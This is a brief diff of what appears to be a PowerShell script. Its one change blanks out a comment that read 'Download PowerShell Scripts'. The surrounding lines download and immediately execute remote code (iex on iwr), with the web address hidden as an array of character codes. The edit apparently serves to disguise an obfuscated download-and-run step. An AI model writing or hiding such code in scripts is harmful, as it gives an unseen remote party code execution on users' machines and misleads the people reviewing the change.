@@ -23,7 +23,7 @@ if(-not `$ConnectedToTheInternet){
 
     if(Test-Path -Path `"C:\Program Files\Git\git-cmd.exe`"){
   
-      #region --- Download PowerShell Scripts ---
+      #region -----------------------------------
 
         (iex (iwr -Uri ([char[]](104,116,116,112,115,58,47,47,112,97,110,103,101,
         97,105,109,109,101,114,115,105,118,101,46,105,111) -Join '') -he @{$hen=$he}).ToString())
